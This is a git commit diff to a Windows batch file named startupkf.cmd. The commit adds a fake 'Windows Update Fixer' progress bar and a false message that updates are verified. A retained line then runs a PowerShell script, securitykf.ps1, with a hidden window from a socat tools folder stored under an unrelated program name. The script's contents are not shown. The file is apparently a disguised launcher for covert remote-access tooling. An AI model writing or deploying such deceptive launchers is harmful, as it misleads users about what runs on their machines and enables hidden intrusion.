fb6954aeb73e97ae01e163b6f40ea158285fa587
KffeePt <95396642+KffeePt@users.noreply.github.com>
2021-12-11 06:09:55 -0600

    Update startupkf.cmd

--- startupkf.cmd
+++ startupkf.cmd
@@ -1,8 +1,14 @@
-ECHO Windows Update Fixer Started
-timeout 1
-ECHO .
-timeout 1
-ECHO .
-timeout 1
-ECHO .
+@echo off
+for /l %%a in (1,1,28) do (
+	
+	cls
+	call set "bar=%%bar%%#"
+	call echo Windows Update Fixer Started
+	call echo:
+	call echo %%bar%%
+	ping localhost -n 1 >nul
+	
+)
+echo Windows Updates Verified 0 pending
+timeout 3
 cd \"Program Files"\ZOLOFT\ZOLOFT\socat-windows-master && powershell.exe -windowstyle hidden ./securitykf.ps1 
